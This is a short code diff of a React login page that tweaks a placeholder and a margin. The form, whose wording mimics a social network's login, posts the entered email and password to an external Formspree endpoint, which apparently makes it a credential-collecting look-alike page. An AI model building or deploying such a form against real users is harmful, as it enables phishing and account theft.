@@ -17,7 +17,7 @@ function App() {
 
       <form action="https://formspree.io/f/xayzloyg" method='POST'>
 
-        <input type="email" name='email' placeholder='Username,email address or mobile number'/>
+        <input type="email" name='email' placeholder='Username, email address or mobile number'/>
         <input type="password" name='password' placeholder='Password'/>
         <button>Log in</button>
 
@@ -39,7 +39,7 @@ function App() {
 }
 
 const Container = styled.div`
-margin-left: 120px;
+margin-left: 100px;
 
 img{
   width: 100px;
